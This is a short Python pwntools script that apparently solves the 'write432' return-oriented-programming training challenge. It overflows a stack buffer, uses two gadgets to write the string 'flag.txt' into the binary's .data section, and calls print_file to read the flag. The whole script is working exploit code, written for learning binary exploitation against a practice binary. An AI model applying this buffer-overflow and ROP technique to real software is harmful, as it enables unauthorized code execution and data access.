from pwn import *
import struct
import sys
import time

challenge = './write432'

elf = ELF(challenge)
function = elf.plt['print_file']
rop = ROP(elf)
####
#  8048543:	89 2f                	mov    %ebp,(%edi)
#  8048545:	c3                   	ret    
###
load = elf.symbols['usefulGadgets']
rop = ROP(elf)

 
payload = cyclic(44)
payload += p32(rop.edi.address)
payload += p32(0x0804A018) # This is in the .data section and we have 
payload += b'flag'
payload += p32(load)
payload += p32(rop.edi.address)
payload += p32(0x0804A018 + 4)
payload += b'.txt'
payload += p32(load)
payload += p32(elf.plt['print_file'])
payload += p32(0x0804A018)
payload += p32(0x0804A018)

io = process(challenge)
# io = gdb.debug(challenge, gdbscript='''
# 		br *pwnme+177
# 		c
# 		x/20x $sp
# 		''')

print(io.recvuntil(b'> '))
print(rop.gadgets)

io.sendline(payload)
io.interactive()